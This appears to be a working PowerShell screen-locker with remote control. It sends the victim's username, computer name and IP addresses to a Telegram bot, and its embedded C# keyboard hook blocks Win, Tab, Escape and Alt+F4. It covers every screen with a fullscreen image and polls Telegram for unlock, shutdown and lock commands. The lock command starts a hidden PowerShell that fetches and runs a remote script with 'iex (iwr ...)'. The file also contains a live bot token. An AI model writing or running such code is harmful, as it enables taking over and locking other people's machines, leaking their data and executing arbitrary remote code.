# CONFIG
$imageUrl = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImage = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$user = $env:USERNAME
$pc = $env:COMPUTERNAME
$lockFile = "$env:APPDATA\lock_status.txt"

# INITIAL STATE
if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }
$state = Get-Content $lockFile -ErrorAction SilentlyContinue
if ($state -ne "locked") { return }

# Download image
Invoke-WebRequest $imageUrl -OutFile $tempImage -UseBasicParsing

# SEND TELEGRAM
try {
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169)' })[0].IPAddress
} catch { $localIP = "n/a" }
try { $publicIP = (Invoke-RestMethod "https://api.ipify.org") } catch { $publicIP = "n/a" }

$msg = "PC-ul $user ($pc) a fost blocat.`nIP: $localIP | $publicIP`n`nComenzi:`n/unlock$user`n/shutdown$user`n/lock$user"
$body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'

# --- HOOK TO BLOCK KEYS ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyInterceptor {
    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static bool alt = false;

    public static void Start() {
        using (var curProcess = Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public static void Stop() {
        UnhookWindowsHookEx(hookId);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            if (key == Keys.LWin || key == Keys.RWin || key == Keys.Tab || key == Keys.Escape)
                return (IntPtr)1;
            if (key == Keys.F4 && (Control.ModifierKeys & Keys.Alt) == Keys.Alt)
                return (IntPtr)1;
            if (key == Keys.C && (Control.ModifierKeys & Keys.Control) == Keys.Control)
                Environment.Exit(0);  // Emergency exit with Ctrl+C
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyInterceptor]::Start()

# FULLSCREEN IMAGE
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'
        WindowState = 'Maximized'
        StartPosition = 'Manual'
        TopMost = $true
        Location = $screen.Bounds.Location
        Size = $screen.Bounds.Size
        Cursor = [System.Windows.Forms.Cursors]::None
        BackColor = 'Black'
        KeyPreview = $true
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImage)
        Dock = 'Fill'
        SizeMode = 'StretchImage'
    }
    $form.Add_Deactivate({ $form.Activate() })
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# TELEGRAM POLLING
$offset = 0
try {
    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($init.result.Count -gt 0) {
        $offset = ($init.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 4000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $text = $u.message.text.ToLower().Trim()
            $cmd = "/unlock$user","/shutdown$user","/lock$user" | Where-Object { $text -eq $_ }
            switch ($cmd) {
                "/unlock$user" {
                    "unlocked" | Out-File $lockFile -Force
                    [Windows.Forms.Application]::Exit()
                }
                "/shutdown$user" {
                    "unlocked" | Out-File $lockFile -Force
                    Stop-Computer -Force
                }
                "/lock$user" {
                    "locked" | Out-File $lockFile -Force
                    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (iwr 'https://raw.githubusercontent.com/diezul/x/main/k.ps1')`""
                    [Windows.Forms.Application]::Exit()
                }
            }
        }
    } catch {}
})
$timer.Start()

# LOOP
[Windows.Forms.Application]::Run()

# CLEANUP
$timer.Stop()
[KeyInterceptor]::Stop()
